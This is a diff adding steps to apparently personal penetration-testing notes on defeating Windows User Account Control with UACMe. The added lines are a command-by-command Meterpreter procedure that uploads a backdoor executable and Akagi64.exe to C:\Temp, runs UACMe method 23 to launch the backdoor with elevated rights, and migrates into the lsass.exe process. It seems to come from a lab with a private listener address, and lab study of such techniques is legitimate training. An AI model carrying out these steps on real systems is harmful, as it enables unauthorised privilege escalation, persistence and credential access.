@@ -175,3 +175,21 @@ With UACMe defeat Windows User Account Control by abusing built-in Windows AutoE
 - `set LHOST 10.10.37.3`
 - `set LPORT 1234`
 - `run`
+- `cd C:\\` Back on the tab with the aktive meterpreter session
+- `mkdir Temp` create new directory because you never want to upload your malicious files in a working directory.
+- `cd Temp`
+- `upload backdoor.exe`
+- `upload /root/Desktop/tools/UACME/Akagi64.exe` You have to download this file first from the UACMe Link
+- `shell`
+- `.\Akagi64.exe 23 C:\Temp\backdoor.exe` 
+![image](https://github.com/user-attachments/assets/7603290a-e095-46ca-9b27-a38abf9abc25)
+- `ps` show prozess list
+- `migrate (PID from Process lsass.exe)`
+- `sysinfo` and `getuid` to confirm
+
+![image](https://github.com/user-attachments/assets/5c05e69a-84d8-4e3f-9bc2-d1c32fc74da0)
+![image](https://github.com/user-attachments/assets/aa911d85-4fd1-4efe-ae6b-c0c797a2c06d)
+![image](https://github.com/user-attachments/assets/ed81bba4-e9c8-4f9d-819d-93cd350fd291)
+
+
+
